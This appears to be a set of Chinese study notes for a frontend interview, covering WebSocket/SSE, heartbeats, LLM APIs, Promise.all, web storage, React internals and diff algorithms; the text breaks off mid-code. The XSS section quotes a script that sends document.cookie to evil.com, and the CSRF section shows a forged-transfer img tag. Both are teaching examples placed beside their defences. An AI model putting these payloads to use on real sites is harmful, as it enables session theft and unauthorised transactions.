## 字节一面

### Web Socket 和sse 区别

- WebSocket 是一种在浏览器和服务器之间建立“长连接”的协议，可以实现双向实时通信。
- 项目需求分析
    chat-app 是聊天应用， 需求
    - 实时收消息
    - 实时发消息
    - 多人同步
    如果用http:
    - 客户端只能“请求 → 响应”
    - 想实时?
        只能轮询（性能差）
        定时setInterval 
    - 而 WebSocket：
    - 一次连接，持续通信(双工)
    - 服务端可以“主动推送”

    ![](https://img2.baidu.com/it/u=549937028,3721254999&fm=253&fmt=auto&app=138&f=JPEG?w=845&h=500)
    WebScoket socket 协议在web端的实现

    ![](https://img2.baidu.com/it/u=3823662998,3984986978&fm=253&fmt=auto&app=138&f=JPEG?w=1024&h=440)
    HTTP和WebSocket都跑在TCP上。HTTP是请求响应，WebSocket是长连接，能双向实时通信，适合聊天、推送这类场景。

    QQ Wechat 用的就是Socket 协议
    WebScoket 是Socket的Web 版本

- 面试官为什么要靠这个问题？
    - 前端比较熟悉的是http 协议， 跨协议，408（数据结构、计算机组成原理、操作系统和计算机网络）考察
    - sse ai 应用开发的核心体验
    SSE 轻量单向，专为服务端推送设计，更简单适配。
    - websocket 适合实时通信
    WebSocket 是全双工协议，需自定义协议、心跳、重连，复杂度高；

- 项目 2025_chun/html5/chat-app
- 跨域的解决方案
    interview/2025_chun/js/cors/postmessage-demo/index.html
    https://github.com/shunwuyu/ai_lesson/tree/e5414505c45bb06a78e76c4521e83d22f7385e24/interview/2025_chun/js/cors

    https://github.com/shunwuyu/ai_lesson/blob/e5414505c45bb06a78e76c4521e83d22f7385e24/js/cross_domain/jsonp/1.html#L11  jsonp 
    https://github.com/shunwuyu/ai_lesson/tree/e5414505c45bb06a78e76c4521e83d22f7385e24/js/cross_domain/demo 
    cors
    https://github.com/shunwuyu/ai_lesson/blob/e5414505c45bb06a78e76c4521e83d22f7385e24/js/cross_domain/cors-demo/server.js cors 预检请求

    https://github.com/shunwuyu/ai_lesson/blob/e5414505c45bb06a78e76c4521e83d22f7385e24/interview/2025_chun/js/cors/readme.md

### 介绍心跳机制

心跳机制就是：客户端和服务端定期互相“报平安”，用来检测连接是否还活着。

用生活类比

就像两个异地恋人打电话📞：

如果很久没声音，你会说一句：“喂？还在吗？”
对方回一句：“在的”
👉 这就是“心跳”

为什么需要心跳
因为 WebSocket / SSE 是长连接

- 网络可能断了
- 用户可能掉线
- 中间设备（Nginx、负载均衡）可能会自动断开空闲连接（省资源， 服务更多人）
所以必须主动检测连接状态

- 心跳机制怎么实现？
    ping / pong 只是约定俗成的名字，不是规定，你想叫什么都行！
    - 客户端发（最常见）
    ```
    setInterval(() => {
        ws.send(JSON.stringify({ type: 'ping' }))
    }, 30000)
    ```
    服务端收到
    ```
    if (msg.type === 'ping') {
        ws.send(JSON.stringify({ type: 'pong' }))
    }
    ```
    - 认为连接断了
    - 触发重连

- 方式二：服务端发
    - 服务端定期 ping
    - 客户端回 pong
    多用于：
    - 即时通讯（IM）
    - 游戏服务器

- 心跳机制一般包含 3 步：

    - 定时发送 ping
    - 接收 pong 响应
    - 超时判断 + 重连机制
- SSE 的心跳怎么做（很多人答不上来）
    SSE 没有内置 ping/pong
    一般这样做：
    res.write(': heartbeat\n\n')
    或者定期推一条空数据
    作用：

    防止连接被中间代理断开
    保持活跃

最后总结（收尾）

👉 心跳机制的本质：

检测连接是否存活
防止“假连接”
配合重连机制保证实时通信稳定

- 重连代码
```
let ws
let timer
let retry = 0

function connect() {
  ws = new WebSocket('ws://localhost:8080')

  ws.onopen = () => {
    retry = 0
    heartbeat()
  }

  ws.onmessage = (e) => {
    const msg = JSON.parse(e.data)
    if (msg.type === 'pong') resetHeartbeat()
  }

  ws.onclose = reconnect
  ws.onerror = reconnect
}

function reconnect() {
  clearInterval(timer)
  setTimeout(connect, Math.min(1000 * 2 ** retry++, 10000))
}

function heartbeat() {
  timer = setInterval(() => {
    ws.send(JSON.stringify({ type: 'ping' }))
  }, 3000)
}

function resetHeartbeat() {
  clearInterval(timer)
  heartbeat()
}

connect()
```
### SSE 客户端和服务端应该怎么设置?

- 场景举例

后端（NestJS @Sse 装饰路由）
- 使用 rxjs 将 llm stream 包装成 Observable 流，
- 通过async generator 异步生成器，配合yield逐次返回文本片段，结合循环持续处理 AI 流与工具调用，实现不间断流式输出。

前端通过 EventSource 监听 SSE 流，实时接收后端推送的 chunk 并追加渲染，实现文字逐字显示的流式输出。
    - 接收sse 的url
    - onmessage

- 除了  EventSource（SSE），还可以使用 原生 fetch + ReadableStream
直接读取流式响应，兼容性强

https://github.com/shunwuyu/ai_lesson/blob/35ef50f402c1299a268a19526aa1eadc32961278/html5/sse/sse-demo/react-event-source/src/App.jsx

- Sse 接口和 res.write原生手动写 HTTP 响应流 区别
@Sse 是标准的 SSE 长连接推送协议，自带格式、自动重连、浏览器原生支持。
res.write 只是原生 HTTP 流写入，没有协议、没有重连、完全手动控制。

- SSE http头怎么设置？
    Content-Type: text/event-stream 告诉浏览器这是 SSE 流式数据，不是普通 HTTP 响应 
    Cache-Control: no-cache 
    防止中间代理/浏览器缓存，保证数据是实时的
    Connection: keep-alive
    http 1.1 HTTP 长连接 + 文本流格式
    保持 TCP 长连接不断开
    Transfer-Encoding: chunked
    启用分块传输，让数据可以一段一段实时推送

    NestJS 的 @Sse 已经默认帮我们设置好了这些头，但如果走 Nginx，还需要关闭 proxy_buffering，否则数据会被缓存导致不实时。


- 和大模型对话的 completion 接口介绍一下。你有什么参数传入了 Completion 接口？为什么用 open AI 原生的 sdk 调用接口？

    - 面试官心态
    考察你对大模型接口原理、参数调优理解，以及工程实践能力（SDK使用、稳定性与封装设计）。

    - completion 接口是大模型的核心对话接口，用来接收用户 prompt 并返回生成文本。即AIGC 核心功能， 除了completion 外， 还有chat Completion 接口，需要传递messages 对话数组， Embeddings接口负责 向量生成， 多模态模型还有image\audio\vision 接口， 上传相应的多媒体文件就好


    - 基础参数
    ```
    {
    model: "gpt-4o-mini",
    messages: [
        { role: "system", content: "你是一个前端专家" },
        { role: "user", content: "解释闭包" }
    ]
    }
    ```
    生成控制（体现理解深度🔥）
    temperature  取值范围是 0 ~ 2，常用 0 ~ 1。
    值越低（0~0.3）：越严谨、固定、确定性高
    值越高（0.7~2）：越随机、创意强、发散性高

    max_tokens 👉 限制输出长度 控制响应长度、避免冗余并节省 token 成本
    stream: true 流式输出
    tools / function calling 让模型调用函数
    返回多少条结果 用参数n

    - 为什么用 OpenAI 原生 SDK

    OpenAI 官方 SDK 是业内通用标准方案，封装完善、兼容性强、迭代及时，使用它能降低接入成本、提升稳定性，也更符合行业最佳实践。

    - 我在拍照记单词项目中 使用了KIMI 图片解析 + 火山引擎tts 
    - 我在nestjs 全栈项目中使用了@langchain/openai 来快速开发llm 应用

### 手撕Promise.all

先说思路

Promise.all 的核心是：并发执行多个 Promise，全部成功才返回结果，只要有一个失败就立即 reject。

实现上我会做三件事：

用数组按顺序收集每个 Promise 的结果
用计数器记录完成数量
任意一个失败就直接 reject，全部成功才 resolve”

同时需要处理非 Promise 值，用 Promise.resolve 包一层

```
Promise.myAll = function (promises) {
  return new Promise((resolve, reject) => {
    const result = []
    let count = 0

    if (promises.length === 0) {
      return resolve([])
    }

    promises.forEach((p, index) => {
      Promise.resolve(p).then(res => {
        result[index] = res
        count++

        if (count === promises.length) {
          resolve(result)
        }
      }).catch(reject)
    })
  })
}
Promise.resolve(p) 
把数组里的每一项 包装成一个标准 Promise 对象
如果本身就是 Promise， 完全无害，会直接返回这个原 Promise 本身
```

```
Promise.myResolve = function(value) {
  // 如果已经是 Promise 实例，直接返回它自己
  if (value instanceof Promise) {
    return value;
  }

  // 如果是 thenable 对象（有 then 方法），包装成标准 Promise
  if (value && typeof value.then === 'function') {
    return new Promise((resolve, reject) => {
      value.then(resolve, reject);
    });
  }

  // 普通值：直接返回一个 已成功(resolved) 的 Promise
  return new Promise(resolve => resolve(value));
};
```

### cookie, sessionStorage, localStorage

- 共性
“cookie、localStorage、sessionStorage 本质都是浏览器端的存储方案，用于在客户端保存数据，实现状态持久化。”

    - 都是键值对存储
    - 都遵循同源策略
    - 都只能存字符串（需手动 JSON 序列化）
    - 都用于保存用户状态（登录态、配置、缓存等）

- 区别
    - Cookie（偏服务端协作）Cookie = 唯一能“自动带到服务端”的存储
    Cookie 容量受限（通常4KB），过大会增加带宽消耗与解析延迟，降低请求性能。建议仅存会话ID，大数据存服务端。
    ![](https://images.openai.com/static-rsc-4/BQoDS4Gs2Ra6uZpUINOcfNVT3XBUk8Ptaa9Q_HcmrlM0590SVjaOXgkh1VEb7Oure_ojATUkuA_I2a8TgVs6mFzMd3BCmho1DVAFpwPJKoNQr9GjLfMbpP1OzpO22awnREjFvQQR2_ZrB25iq8DdhFpQQuDUXj9LcYgJh_U1KTc?purpose=inline)
    ![](https://images.openai.com/static-rsc-4/IWOs5yoRMKvE7F6Au0ZzyIl9-WxNqIbDozkDX3wcUhdY6MFWHySk1g_6wc4VAxFUh-GkW0pRQp9KgeU1e7yeX5pzhMJK2SvWiNrCPT9cSGd1Teqi2nQsAgKe9b1GkvDlTJ1ycFmeeha11rMWu2kNf7_vG3djXrvrb1Dg2NnajKw?purpose=inline)

    客户端先登录，服务器创建会话、把用户信息存起来并生成 session ID 返回给浏览器；之后每次请求都带上这个 ID，服务器收到后用它去数据库或缓存里“捞出”对应的用户对象，验证身份合法后才返回资源。本质是：ID 是钥匙，换来的是完整的用户数据。

    - cookie-login-demo
    - XSS ? http-only 怎么防？
    Cross-Site Scripting（跨站脚本攻击） CSS 避讳
    “XSS（跨站脚本攻击）的本质是：攻击者把恶意 JavaScript 注入到页面里，在用户浏览器中执行。”

    举个例子
    比如评论区没有做过滤，用户输入
    <script>
    fetch('https://evil.com?cookie=' + document.cookie)
    </script>
    当别人打开页面时，这段脚本就会执行，把用户的 cookie 发送给攻击者。”

    “常见危害就是：

    窃取 cookie（劫持登录态）
    冒充用户发请求
    篡改页面内容”

    二、HttpOnly 怎么防 XSS

    “HttpOnly 是加在 Cookie 上的一个属性，它的作用是：
    👉 禁止 JavaScript 读取 Cookie（document.cookie 拿不到）”

    “即使攻击者注入了脚本：

document.cookie

👉 也拿不到带 HttpOnly 的 cookie

这样就防止了最常见的登录态窃取。”

    不过 HttpOnly 只能防止读取 cookie，并不能阻止 XSS 本身执行。

    完整防御思路（拉开差距🔥）

    👉
    “所以实际项目中我会组合多种手段：

    输入过滤 / 输出转义（最根本）
    const clean = input.replace(/[<>"'&]/g, s => ({
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;',
    '&': '&amp;'
    }[s]))
    <script></script> 会变成
    &lt;script&gt;&lt;/script&gt;
    HttpOnly Cookie 防止敏感信息被读取
    避免使用 innerHTML，改用安全 API”
    el.textContent = userInput

2. localStorage（长期存储）
永久存储（除非手动删除）
不会自动发送给服务器
容量大（≈5MB）
多 tab 共享

localStorage = 持久化配置/缓存

界面主题/购物车临时存储/表单草稿自动保存/JWT/用户行为埋点缓冲：将用户的点击、浏览等行为数据先暂存本地，积攒一定数量后批量上报，降低网络请求频率。/离线数据缓存 商品分类列表 汽车之家名牌

3. sessionStorage（会话级存储）

- 关闭 tab 就清除
- 不同 tab 不共享（重点！）
- 不自动发送给服务器

sessionStorage = 会话级临时状态

页面滚动位置恢复   丛首页到详情页， 再返回， 回到首页的位置
多步骤流程（如支付/注册） 分步骤表单（step1 → step2 → step3） 避免中途刷新丢流程

三、核心区别（面试一定要总结）
特性	Cookie	localStorage	sessionStorage
生命周期	可设置	永久	关闭 tab 清除
是否发给服务器	✅ 自动发送	❌	❌
容量	小（4KB）	大（5MB）	大（5MB）
跨 tab	✅	✅	❌
安全性	可 HttpOnly	❌	❌

CSRF（跨站请求伪造）是指攻击者诱导已登录用户在不知情的情况下发起请求，从而以用户身份执行操作的攻击方式。
比如用户已登录银行网站，此时访问了一个恶意页面，页面中隐藏了一段代码：

<img src="https://bank.com/transfer?to=attacker&amount=1000" />

👉 浏览器会自动携带用户的 Cookie 发起请求，服务器误以为是用户本人操作，从而完成转账。

CSRF 防御本质：让“伪造请求”无法通过身份校验

CSRF Token（最核心 ⭐）

👉 服务端生成随机 token，下发给前端页面，因同源策略限制，恶意网站无法读取受害者域名下的响应头或页面内容，故无法获取该令牌。
```
<!-- HTML 部分 -->
<head>
  <meta name="csrf-token" content="a1b2c3d4-e5f6-7890-g1h2-i3j4k5l6m7n8">
</head>

<!-- JavaScript 部分 (以原生 JS 为例) -->
<script>
  // 1. 获取 Token
  const token = document.querySelector('meta[name="csrf-token"]').getAttribute('content');

  // 2. 在请求中使用 (例如使用 fetch)
  fetch('/api/transfer', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': token  // 放入自定义请求头
    },
    body: JSON.stringify({ amount: 100 })
  });
</script>
```

fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': token
  }
})

👉 服务端校验 token 是否匹配

SameSite Cookie

👉 限制 Cookie 跨站携带

Set-Cookie: session=abc; SameSite=Strict
Strict 👉 完全禁止跨站发送
Lax 👉 部分允许（默认）

验证 Referer / Origin
👉 判断请求来源是否合法



- 为什么现在登陆不用cookie, 而用localStorage + token？
    传统 Cookie + Session 方案需要在服务端存储会话数据（内存/Redis），在分布式场景下必须做会话共享，增加系统复杂度和运维成本；同时 Cookie 会自动随请求发送，容易遭受 CSRF 攻击且跨域受限。相比之下，localStorage + token（如 JWT）由前端手动放在 Authorization 头中，服务端无需存储状态，天然适合分布式和微服务架构，扩展性更好，也更灵活可控；再结合 HttpOnly Cookie 或刷新 token 机制，可以进一步提升安全性。

- cookie 为什么比localStorage？
    Cookie 可以设置 HttpOnly、Secure、SameSite 等属性，能禁止 JS 读取、防止 XSS 窃取，并限制跨站请求，安全控制更细；而 localStorage 完全暴露在 JS 环境中，一旦发生 XSS 攻击，数据很容易被直接获取，因此整体安全性不如 Cookie。
    所以双token

### 浏览器解析页面全过程
    浏览器渲染进程在 render 阶段会先把 HTML 解析成 DOM 树，同时解析 CSS 生成 CSSOM，然后合并成渲染树；接着进行布局（计算每个元素位置和大小），最后进行绘制（paint）, GPU 进程负责把这些绘制指令进行栅格化 + 合成（composite），最终显示到屏幕.

    栅格化就是把“绘制指令”变成一块块像素图片（砌墙），方便 GPU 快速贴到屏幕上显示。

    渲染引擎负责算怎么画，GPU 负责真正把它画出来并合成上屏。

    - render 阶段html做了什么？
    HTML 在 render 阶段会被解析成 DOM 树，而且是流式解析（一边读取 HTML 字节流，一边逐步生成 DOM 节点，不是等全部解析完才一次性构建。），过程中遇到 script 可能阻塞并修改 DOM，同时为后续生成渲染树做准备

### react中 hooks 是怎么实现的？

“React Hooks 本质是：用一个数组（或链表）按顺序存状态，通过调用顺序来定位每个 hook。”

案例驱动

1. 核心矛盾：函数组件是“失忆”的

普通的 JavaScript 函数，每次调用执行完后，里面的局部变量就全部销毁了。
React 的函数组件本质上就是一个函数。

第 1 次渲染：function App() { let [count, setCount] = useState(0); ... } -> 执行完，count 消失。

第 2 次渲染：用户点击按钮，React 重新调用 App() 函数。此时内存里没有上一次的 count 了，一切从零开始。

问题：既然每次都重来，React 怎么知道上一次 count 是 1 还是 10？怎么知道第二个 useState 对应的是哪个数据？

2. 解决方案：外挂一个“剧本提示卡”（数组）

React 在函数外部（组件实例层级）维护了一个数组（通常叫 hooksList 或 memoizedState）。这个数组不会随着函数执行结束而销毁。

function App() {
  const [name, setName] = useState('Alice');   // 第 1 个 Hook
  const [age, setAge] = useState(18);          // 第 2 个 Hook
  const [job, setJob] = useState('Dev');       // 第 3 个 Hook
}

第一次渲染（初始化）：
React 创建一个空数组：[]
执行到第 1 行 useState：React 往数组推入一个新对象 { state: 'Alice' }。数组变成：[{ state: 'Alice' }]
执行到第 2 行 useState：React 往数组推入 { state: 18 }。数组变成：[{ state: 'Alice' }, { state: 18 }]
执行到第 3 行 useState：React 往数组推入 { state: 'Dev' }。数组变成：[{...}, {...}, {...}]
关键点：此时，name 的值其实是从数组索引 0 拿到的，age 是从索引 1 拿到的。
第二次渲染（用户修改了 age）：
用户触发更新，React 再次调用 App() 函数。
注意：这次不再创建新数组，而是复用上次那个已经存有数据的数组：[{ state: 'Alice' }, { state: 18 }, { state: 'Dev' }]。
执行到第 1 行 useState：React 不推入新数据，而是直接读取数组索引 0 的数据 -> 拿到 'Alice'。
执行到第 2 行 useState：React 读取数组索引 1 的数据 -> 拿到 18。
执行到第 3 行 useState：React 读取数组索引 2 的数据 -> 拿到 'Dev'。
3. 为什么必须是“数组”且依赖“顺序”？
因为函数组件内部没有名字留给 React 识别（数组性能更优， map慢）！
当你写 const [name, setName] = useState(...) 时，变量名 name 只是你代码里的别名，React 运行时看不到 "name" 这个字符串，它只看到调用了 useState 这个函数。
如果没有顺序限制：
React 不知道当前调用的 useState 对应数组里的哪一张“提示卡”。
有了顺序限制：
React 只需要一个指针 cursor。
遇到第 1 个 useState，指针指向 array[0]。
遇到第 2 个 useState，指针指向 array[1]。
只要代码书写顺序不变，指针就能精准找到对应的数据。

- 如果顺序乱了会发生什么？（
假如你在第二次渲染时，因为在中间加了一个 if 判断，导致少执行了一个 useState：

// 错误示范
function App() {
  const [name, setName] = useState('Alice'); // 读 array[0] -> 'Alice' (正常)
  
  if (someCondition) {
     // 假设这里条件变了，这行没执行！
     // const [age, setAge] = useState(18); 
  }
  
  const [job, setJob] = useState('Dev'); // 原本该读 array[2]，但现在它是第 2 个被调用的，所以读了 array[1]!
}

job 变量竟然拿到了 18（原本属于 age 的数据）！类型错乱，程序崩溃。

为什么要数组？ 因为函数局部变量存不住状态，必须存在函数外部的持久化容器里。
为什么要按顺序？ 因为 React 没法给每个 Hook 起名字（变量名运行时不可见），只能靠“第几次调用”作为身份证（索引）去数组里取对应的数据。
这就是为什么 React 规定：Hook 不能在循环、条件判断或嵌套函数中调用。

### 对fiber 机制的理解？

- fiber 机制
Fiber 是 React16 引入的一套可中断、可恢复的渲染机制，本质是把原来一次性执行的渲染过程，拆成很多小任务，避免长时间阻塞主线程。

Fiber = 可调度的虚拟 DOM

- 虚拟 DOM vs Fiber

    - 虚拟 DOM（简单结构）
    ```
    const vdom = {
        type: 'div',
        props: { children: [...] }
    }
    ```
    将直接操作慢速真实DOM，转为快速内存计算，批量最小化更新。

    - Fiber 节点（重点⭐）
    const fiber = {
        type: 'div',
        stateNode: dom,      // 真实 DOM
        child: null,         // 第一个子节点
        sibling: null,       // 兄弟节点
        return: null,        // 父节点
        alternate: null      // 双缓存（旧 fiber）
    }

    ![](https://images.openai.com/static-rsc-4/P6bVBOJsWCqiX09IVzX0afIFA1x8pjd3YZ926JztLbewkyS3xPzkcYqb9vl487u6IYy8Ar7ClnvZJwrhUvbxvDaQo-vcaJdPUhP_V_fC_-Y3Fd-dugWBCYiScFR9MDJzRSn5PRYBGTmICh-RM2gAvw7FsUH81qmq1A-xj-89em4?purpose=inline)

    你住的老房子（真实 DOM）太慢，每次改个墙色都得拆墙重刷 —— React 说：“别急，我先在纸上画个新布局（虚拟 DOM），算清楚哪几块要动。”
然后它派了个聪明工头叫 Fiber（橙色那串），边画图边能中途停下接电话（可中断渲染），不打扰你睡觉。
等图纸定稿（Render Phase），工头带人冲进去只改需要动的地方（Commit + DOM Update），省时省力。
生命周期就是房子从盖好（Mounting）、翻新（Updating）到拆掉（Unmounting）的全过程；Hooks 是你随时喊“我要加个插座！”的工具包。
整张图就一句话：React 靠“纸面预演 + 智能施工”，让你网页丝滑如德芙。

    ![](https://images.openai.com/static-rsc-4/7X2QaLD3fyO9k4LkHajvqIyiPYb5BQNeQS8mDMFljdkUC0YyYTBgQQbsYDr5-LBP1kl6tVAJTUQaKPmw8XM8z0R64Ln-lrdInyfEgrYHldlrPrDWJXqzhgSdvQVTRYgsfs5aYUN72qtaYaTsEWTB67hxTCR0_Ws5nlE7M0mUCl8?purpose=inline)

    这张图讲的是 React Fiber 怎么“链表化”树结构：div 是爹，h1 是第一个孩子（child），h2、h3 是 h1 的兄弟（sibling），靠指针串起来。这样遍历不用递归，能随时暂停继续——就像打游戏存档读档，渲染不卡壳！

    fiber 本质 = 链表 + 树（方便中断遍历）

四、Fiber 遍历原理

    “Fiber 用的是深度优先遍历（DFS），但和递归不同，它是可中断的循环。”

    function performUnitOfWork(fiber) {
  // 1. 处理当前节点
  console.log('处理:', fiber.type)

  // 2. 先找子节点
  if (fiber.child) {
    return fiber.child
  }

  // 3. 没子节点 → 找兄弟
  let next = fiber
  while (next) {
    if (next.sibling) {
      return next.sibling
    }
    next = next.return
  }
}

遍历顺序

A
├── B
│   └── D
└── C

A → B → D → C

五、为什么 Fiber 可以中断？（重点🔥）

👉
“因为它是一个 while 循环，每处理一个节点就是一个‘任务单元’”

function workLoop(deadline) {
  // 循环执行条件：
  // 1. nextUnitOfWork: 还有未完成的工作单元（Fiber 节点）
  // 2. deadline.timeRemaining() > 0: 浏览器当前帧还有剩余空闲时间（通常约 5-15ms）
  while (nextUnitOfWork && deadline.timeRemaining() > 0) {
    // 处理当前的 Fiber 节点：
    // - 计算该节点的变更（diff）
    // - 创建子节点或兄弟节点的 Fiber 对象
    // - 返回下一个需要处理的任务单元
    nextUnitOfWork = performUnitOfWork(nextUnitOfWork)
  }

  // 如果时间用完了但任务还没做完（nextUnitOfWork 依然存在）
  if (nextUnitOfWork) {
    // 让出主线程控制权，告诉浏览器：“等下一帧有空闲时，再叫我继续干活”
    // 这样就不会阻塞动画和用户交互，实现“时间切片”
    requestIdleCallback(workLoop)
  }
}

浏览器有空才执行
👉 没空就暂停，下次继续

“Fiber 是 React16 引入的可中断渲染机制，本质是对虚拟 DOM 的增强，每个节点不仅表示 UI，还包含调度信息。它通过 child、sibling、return 组成链表结构，用循环实现深度优先遍历，从而可以拆分任务、支持中断和恢复。这样在大规模更新时不会阻塞主线程，提升用户体验。”

### 手写深度优先
深度优先（DFS）就是：先一路往“最深的子节点”走到底，再回头找兄弟节点继续。
广度优先（BFS）就是：一层一层往下遍历，先把同一层的节点都访问完，再进入下一层。

```
// 深度优先遍历（DFS）- 递归实现
function dfs(node) {
  // 1. 终止条件：节点为空直接返回
  if (!node) return

  // 2. 访问当前节点（先序遍历）
  console.log(node.val)

  // 3. 递归遍历所有子节点（一直往“深处”走）
  node.children?.forEach(child => dfs(child))
}

// 示例树结构
const tree = {
  val: 'A',
  children: [
    {
      val: 'B',
      children: [
        { val: 'D' } // B 的子节点
      ]
    },
    { val: 'C' } // A 的另一个子节点
  ]
}


// 调用 DFS
dfs(tree)

// 输出顺序：A → B → D → C
// 过程：
// 先访问 A
// → 进入 B
// → 进入 D（最深）
// → 回到 B（无兄弟）
// → 回到 A，再访问 C
```

广度优先遍历（BFS）本质就是层序遍历 👍

// 广度优先遍历（BFS）- 使用队列
function bfs(root) {
  // 1. 边界判断
  if (!root) return

  const queue = [root] // 初始化队列（先进先出）

  // 2. 队列不为空就一直遍历
  while (queue.length) {
    const node = queue.shift() // 取出当前层第一个节点

    console.log(node.val) // 访问节点

    // 3. 把子节点依次加入队列（保证按层顺序）
    node.children?.forEach(child => {
      queue.push(child)
    })
  }
}

// 示例树
const tree = {
  val: 'A',
  children: [
    {
      val: 'B',
      children: [{ val: 'D' }]
    },
    { val: 'C' }
  ]
}

// 调用
bfs(tree)

// 输出：A → B → C → D
// 过程：
// 第1层：A
// 第2层：B, C
// 第3层：D


### React 的 diff 算法

React 的 diff 算法本质是：在同层节点中，通过 key 做对比，尽量复用 DOM，减少真实 DOM 操作。

![](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9f0312e46cfa4d978397c429ab4c191b~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

两棵树做 diff，复杂度是 O(n^3) 的，因为每个节点都要去和另一棵树的全部节点对比一次，这就是 n 了，如果找到有变化的节点，执行插入、删除、修改也是 n 的复杂度。所有的节点都是这样，再乘以 n，所以是 O(n * n * n) 的复杂度。

这样的复杂度对于前端框架来说是不可接受的，这意味着 1000 个节点，渲染一次就要处理 1000 * 1000 * 1000，一共 10 亿次。

所以前端框架的 diff 约定了两种处理原则：只做同层的对比，type 变了就不再对比子节点。

因为 dom 节点做跨层级移动的情况还是比较少的，一般情况下都是同一层级的 dom 的增删改。

这样只要遍历一遍，对比一下 type 就行了，是 O(n) 的复杂度，而且 type 变了就不再对比子节点，能省下一大片节点的遍历。另外，因为 vdom 中记录了关联的 dom 节点，执行 dom 的增删改也不需要遍历，是 O(1)的，整体的 diff 算法复杂度就是 O(n) 的复杂度。

![](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5dbd325446ee4d219d6e8876219718c1~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

原来的 <p> 和它的子节点 <span>'guang'</span> 会被整个删除（卸载），因为它们在右边新树中“对应位置”被替换成了一个全新的 <div> 结构 —— React 认为这是类型变更，直接销毁旧子树、创建新子树，不会尝试复用或移动。

- 这样的算法虽然复杂度低了，却还是存在问题的。

type 变了就不再对比子节点的缺点

比如一组节点，假设有 5 个，类型是 ABCDE，下次渲染出来的是 EABCD，这时候逐一对比，发现 type 不一样，就会重新渲染这 5 个节点。

而且根据 type 不同就不再对比子节点的原则，如果这些节点有子节点，也会重新渲染。

dom 操作是比较慢的，这样虽然 diff 的算法复杂度是低了，重新渲染的性能也不高。

所以，diff 算法除了考虑本身的时间复杂度之外，还要考虑一个因素：dom 操作的次数。

上面那个例子的 ABCDE 变为 EABCD，很明显只需要移动一下 E 就行了，根本不用创建新元素。

但是怎么对比出是同个节点发生了移动呢？

判断 type 么？ 那不行，同 type 的节点可能很多，区分不出来的。

最好每个节点都是有唯一的标识。

所以当渲染一组节点的时候，前端框架会让开发者指定 key，通过 key 来判断是不是有点节点只是发生了移动，从而直接复用。

diff 算法处理一组节点的对比的时候，就要根据 key 来再做一次算法的优化。

我们会把基于 key 的两组节点的 diff 算法叫做多节点 diff 算法，它是整个 vdom 的 diff 算法的一部分。

```
// 旧节点列表 (Old Children)
[
  <li key="A">A</li>,
  <li key="B">B</li>,
  <li key="C">C</li>,
  <li key="D">D</li>
]

// 新节点列表 (New Children) - 场景：删除了 B，插入了 E，顺序打乱
[
  <li key="A">A</li>,
  <li key="C">C</li>,
  <li key="E">E</li>, // 新增
  <li key="D">D</li>
]

// React 的处理结果 (逻辑示意)：
// 1. A: 复用 (位置不变)
// 2. B: 删除 (新列表中没有 key="B")
// 3. C: 复用 (向前移动)
// 4. E: 创建并插入
// 5. D: 复用 (位置不变)
```

#### 多节点 diff 算法

### 简单 diff

渲染 ABCD 一组节点，再次渲染是 DCAB
多节点 diff 算法的目的是为了尽量复用节点，通过移动节点代替创建。
所以新 vnode 数组的每个节点我们都要找下在旧 vnode 数组中有没有对应 key 的，有的话就移动到新的位置，没有的话再创建新的。

![](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d5389c6be37443318d71a9c09aefde7e~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

```
// 获取旧虚拟 DOM 节点和新虚拟 DOM 节点的子节点列表
const oldChildren = n1.children;
const newChildren = n2.children;

// lastIndex 用于记录当前已匹配到的旧节点中最大的索引位置
// 目的是判断是否需要移动节点（如果新节点对应的旧节点索引小于 lastIndex，说明它被“提前”了，需要移动）
let lastIndex = 0;

// ==================== 第一阶段：遍历新子节点列表 ====================
for (let i = 0; i < newChildren.length; i++) {
  const newNode = newChildren[i]; // 当前要处理的新节点
  let j = 0;                      // 用于遍历旧子节点的指针
  let find = false;               // 标记是否在新旧节点中找到 key 相同的节点

  // ==================== 在旧子节点中查找是否有相同 key 的节点 ====================
  for (j; j < oldChildren.length; j++) {
    const oldNode = oldChildren[j]; // 当前正在比较的旧节点

    // 如果找到 key 相同的节点 → 表示可以复用该节点
    if (newNode.key === oldNode.key) {
      find = true; // 标记找到了可复用的节点

      // 调用 patch 函数更新这个节点的内容（属性、事件、子节点等）
      patch(oldNode, newNode, container);

      // 判断是否需要移动 DOM 元素：
      // 如果旧节点在原列表中的位置 j 小于 lastIndex，
      // 说明这个节点在新列表中“提前出现”，需要向后移动以保持顺序
      if (j < lastIndex) {
        // 获取前一个新节点（即上一个已经处理过的新节点）
        const prevVNode = newChildren[i - 1];

        // 如果存在前一个节点，则把当前节点插入到它的下一个兄弟节点之前
        if (prevVNode) {
          const anchor = prevVNode.el.nextSibling; // 锚点：前一个节点的下一个兄弟
          insert(newNode.el, container, anchor);   // 插入操作
        }
      } else {
        // 否则，更新 lastIndex 为当前匹配的旧节点索引 j
        // 表示到目前为止，我们按顺序匹配到了第 j 个旧节点
        lastIndex = j;
      }

      break; // 找到后跳出内层循环，继续处理下一个新节点
    }
  }

  // ==================== 如果没有找到可复用的旧节点 → 创建新节点 ====================
  if (!find) {
    const prevVNode = newChildren[i - 1]; // 获取前一个新节点
    let anchor = null;

    // 确定插入位置：
    // 如果有前一个节点，则插入到它的下一个兄弟之前
    if (prevVNode) {
      anchor = prevVNode.el.nextSibling;
    } else {
      // 如果是第一个节点，则插入到容器的第一个子节点之前（即开头）
      anchor = container.firstChild;
    }

    // 调用 patch(null, newNode, ...) 表示这是一个全新的节点，需要创建并挂载
    patch(null, newNode, container, anchor);
  }
}

// ==================== 第二阶段：清理未被使用的旧节点 ====================
// 遍历所有旧子节点，检查它们是否在新子节点中存在（通过 key 匹配）
for (let i = 0; i < oldChildren.length; i++) {
  const oldVNode = oldChildren[i];

  // 在新子节点列表中查找是否存在与当前旧节点 key 相同的节点
  const has = newChildren.find(vnode => vnode.key === oldVNode.key);

  // 如果没找到 → 说明这个旧节点不再需要，应该卸载（从 DOM 移除 + 清理资源）
  if (!has) {
